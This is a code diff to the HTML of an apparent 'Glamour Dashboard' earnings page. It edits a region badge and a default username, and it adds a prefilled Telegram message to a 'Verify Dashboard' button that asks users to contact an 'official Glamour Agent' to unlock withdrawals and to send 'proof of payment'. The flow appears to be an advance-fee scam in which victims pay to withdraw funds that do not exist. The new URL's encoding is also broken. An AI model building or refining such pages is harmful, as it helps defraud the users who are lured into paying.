@@ -48,7 +48,7 @@
             <div class="flex gap-2">
                 <div class="bg-white/40 px-3 py-1 rounded-full text-[10px] font-bold flex items-center gap-1">
                     <span class="w-2 h-2 bg-green-500 rounded-full"></span>
-                    NG REGION
+                    FOREIGN
                 </div>
                 <div class="bg-white/30 p-2 rounded-full"><i class="fa-regular fa-bell text-xl"></i></div>
             </div>
@@ -160,8 +160,8 @@
             <i class="fas fa-shield-halved text-5xl mb-4 text-amber-500"></i>
             <h2 class="text-xl font-bold mb-2">Verify Dashboard</h2>
             <p class="text-xs opacity-70 mb-6 leading-relaxed">Verify your dashboard with an official Glamour Agent to unlock all features and withdrawals.</p>
-            <!-- Updated Telegram Link -->
-            <button onclick="window.location.href='https://t.me/morrishmedia'" class="withdraw-btn">Verify via Telegram</button>
+            <!-- Updated Telegram Link with Prefilled Professional Message -->
+            <button onclick="window.location.href='https://t.me/morrishmedia?text=Hello,%20I%20would%20like%20to%20verify%20my%20Glamour%20Dashboard%20and%20unlock%20my%20withdrawals%Here%is%my%proof%of%payment.'" class="withdraw-btn">Verify via Telegram</button>
         </div>
     </div>
 
@@ -194,7 +194,7 @@
 
     <script>
         // Track and show username and email from localStorage
-        const username = localStorage.getItem('glamour_username') || "Miracle";
+        const username = localStorage.getItem('glamour_username') || "User";
         const email = localStorage.getItem('glamour_email') || "Not Set";
         
         document.getElementById('user-display').innerText = username;
